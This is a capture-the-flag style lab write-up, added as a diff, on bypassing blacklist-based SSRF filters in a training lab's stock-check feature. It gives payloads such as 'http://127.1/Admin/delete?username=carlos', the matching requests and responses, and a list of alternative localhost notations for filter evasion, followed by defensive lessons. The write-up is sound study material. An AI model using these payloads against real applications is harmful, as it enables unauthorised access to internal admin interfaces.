@@ -1,0 +1,139 @@
+================================
+LAB: SSRF with blacklist-based input filter
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: January 28, 2026
+Lab URL: https://0a8c003c031867bc8311c8fe00e50069.web-security-academy.net
+Category: Server-Side Request Forgery (SSRF)
+Level: Practitioner
+Objective: Change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos
+Description: This lab has a stock check feature which fetches data from an internal system. The developer has deployed two weak anti-SSRF defenses (blacklist-based input filters) that must be bypassed to access the admin panel.
+
+[RECONNAISSANCE]
+----------------
+1. Initial Analysis:
+   - Identified stock check functionality that accepts a 'stockApi' parameter
+   - Normal behavior: POST /product/stock with stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+   - Parameter is URL-encoded in the request body
+   - Response returns stock quantity for products
+
+2. Target Identification:
+   - Goal: Access http://localhost/admin internally
+   - Need to make the application perform a server-side request to its own admin interface
+
+3. Initial SSRF Test:
+   - Attempted direct access: stockApi=http://localhost/admin
+   - Result: HTTP 400 - "External stock check blocked for security reasons"
+   - Conclusion: Two blacklist filters are in place as mentioned in lab description
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+The application implements two weak blacklist-based input filters:
+
+1. First Defense - "localhost" String Detection:
+   - The filter blocks requests containing the string "localhost"
+   - Testing revealed the filter is not comprehensive and doesn't check for all localhost representations
+
+2. Second Defense - "/admin" Path Detection:
+   - The filter blocks requests containing the string "admin" in lowercase
+   - The filter appears to be case-sensitive
+
+These blacklist approaches are inherently weak because:
+- They rely on pattern matching specific strings
+- They don't account for alternative representations (IP notations, encoding, case variations)
+- They don't validate the actual destination of the request
+
+[EXPLOITATION]
+--------------
+Step 1: Bypassing the "localhost" Filter
+- Technique: IPv4 dotted-decimal notation shorthand
+- Payload: http://127.1/
+- Explanation: 127.1 is a valid shortened IPv4 notation that resolves to 127.0.0.1
+- The OS automatically zero-fills missing octets: 127.1 → 127.0.0.1
+- Result: Successfully received the homepage HTML, confirming SSRF
+- The filter only checked for the literal string "localhost", not IP-based alternatives
+
+Step 2: Bypassing the "/admin" Filter  
+- First attempt: http://127.1/admin → Blocked
+- Technique: Case variation bypass
+- Payload: http://127.1/Admin
+- Explanation: The blacklist checks for lowercase "admin" but the web server handles paths case-insensitively
+- Result: Successfully accessed the admin panel
+- Retrieved HTML showing two users: wiener and carlos with delete links
+
+Step 3: Deleting User Carlos
+- Target endpoint identified: /admin/delete?username=carlos
+- Final payload: http://127.1/Admin/delete?username=carlos
+- Maintained the capital "A" in "Admin" to avoid blacklist detection
+- Result: Lab solved - Carlos successfully deleted
+
+[EVIDENCE]
+----------
+Request 1 - Baseline (Blocked):
+POST /product/stock
+stockApi=http://localhost/admin
+Response: 400 Bad Request - "External stock check blocked for security reasons"
+
+Request 2 - Localhost Bypass (Success):
+POST /product/stock
+stockApi=http://127.1/
+Response: 200 OK - Full homepage HTML returned
+
+Request 3 - Admin Path (Blocked):
+POST /product/stock
+stockApi=http://127.1/admin
+Response: 400 Bad Request - "External stock check blocked for security reasons"
+
+Request 4 - Admin Panel Access (Success):
+POST /product/stock
+stockApi=http://127.1/Admin
+Response: 200 OK - Admin panel HTML with user list and delete links
+
+Request 5 - Delete Carlos (Success):
+POST /product/stock
+stockApi=http://127.1/Admin/delete?username=carlos
+Response: Lab solved confirmation
+
+[LESSONS LEARNED]
+-----------------
+1. Blacklist Weaknesses:
+   - Blacklists are fundamentally flawed for security controls
+   - They can only block known bad patterns, not validate good ones
+   - Always prefer allowlist approaches when possible
+
+2. Alternative Representations:
+   - Localhost can be represented in multiple ways:
+     * localhost (hostname)
+     * 127.0.0.1 (full IPv4)
+     * 127.1 (shortened IPv4 notation)
+     * 127.0.0.0 through 127.255.255.255 (entire loopback range)
+     * ::1 (IPv6)
+     * 0.0.0.0, 0, 2130706433 (decimal), 017700000001 (octal)
+   - Security filters must account for ALL possible representations
+
+3. Case Sensitivity Issues:
+   - Filters and backend systems may have different case-handling behavior
+   - Web servers often treat paths case-insensitively on certain platforms
+   - Defense mechanisms should normalize input before validation
+
+4. Defense in Depth:
+   - Single-layer defenses are insufficient
+   - Even with two filters, both were easily bypassed
+   - Proper SSRF protection requires:
+     * Allowlist of permitted destinations
+     * DNS resolution validation
+     * Network segmentation
+     * Separate service accounts with minimal privileges
+
+5. Manual Testing Approach:
+   - Start with simplest bypass techniques first
+   - Test basic variations before complex encoding chains
+   - Understand WHY each bypass works to build mental models
+
+6. IPv4 Notation Shortcuts:
+   - The dotted-decimal notation allows omitting octets
+   - System automatically zero-fills from right to left
+   - 127.1 → 127.0.0.1, not 127.1.0.0
+   - Useful for filter evasion when IP strings are partially blocked
